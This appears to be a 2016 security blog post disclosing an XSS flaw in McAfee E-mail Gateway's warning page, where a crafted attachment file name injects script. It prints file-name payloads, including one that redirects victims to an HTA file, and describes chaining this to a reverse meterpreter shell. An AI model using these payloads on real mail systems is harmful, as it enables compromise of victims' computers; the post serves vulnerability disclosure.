---
id: 380
title: How a spamfilter can help you to drop a shell
date: 2016-04-26T16:13:00+01:00
author: wesley
layout: post
permalink: /2016/04/how-a-spamfilter-can-help-you-phish/
---
A while ago i discovered a cross-site scripting vulnerability (XSS) in the McAfee E-mail Gateway (MEG) 7.6.4. I reported this vulnerability to McAfee, they fixed it within a few months. The security advisory can be found over [here](https://kc.mcafee.com/corporate/index?page=content&id=SB10153). MEG is an application that can be used to filter out malicious attachments from e-mails, however due to the vulnerability an attacker is able to abuse this functionality to drop a malicious file.

The McAfee E-mail Gateway is replacing a malicious file with a warning HTML-file (1_warning.html). I saw that this HTML-file is displaying the filename of the replaced malicious file (e.g. malicious.xlsx). This made me curious, I decided to check whether it was possible to use this filename to perform a cross-site scripting attack because it was used within HTML-context.

In order to check whether the XSS was present, i created a malicious Excel document. The file needs to be malicious in order to be replaced by the McAfee E-mail Gateway. The file was named &#8220;**file<IMG SRC=x onerror=&#8221;alert(&#8216;XSS&#8217;)&#8221;>jem.xls**&#8220;. I e-mailed this file to a e-mailbox that was protected by McAfee E-mail Gateway. When opening the warning HTML-file, the following behavior became clear:

<!--more-->

[<img class="alignnone size-full wp-image-381" src="https://forsec.nl/wp-content/uploads/2016/04/webgatewayxss.jpg" alt="webgatewayxss" width="584" height="432" />](https://forsec.nl/wp-content/uploads/2016/04/webgatewayxss.jpg)

Together with [@rikvduijn](http://www.twitter.com/rikvduijn) i decided to abuse this issue further in order to pop a shell on a target , with some user interaction. The XSS attack can be used to redirect a victim to a malicious website. We decided to use HTA-files, these files can be generated using the awesome [Unicorn](https://github.com/trustedsec/unicorn/blob/master/unicorn.py) script. By performing a document.location on the victims computer, pointed to the HTA-file, our victim should get a popup with the question to open the HTA-file.

After trying, we achieved the redirect with the following filename (replace 99,99,99… with charcodes for URL):  
<pre>file<IMG SRC=x onerror=document.location(String.fromCharCode(99,99,99,99,99,99,99,99,99,99,99,99,99,99))>jem.xls</pre>
The filename was changed and the document was send again to the victim, and the popup appeared!

[<img class="alignnone size-full wp-image-382" src="https://forsec.nl/wp-content/uploads/2016/04/htapopup.png" alt="htapopup" width="434" height="339" />](https://forsec.nl/wp-content/uploads/2016/04/htapopup.png)

When the victim opens the file, his computer runs a reverse https meterpreter backdoor. Thank you e-mail filter :-).

&nbsp;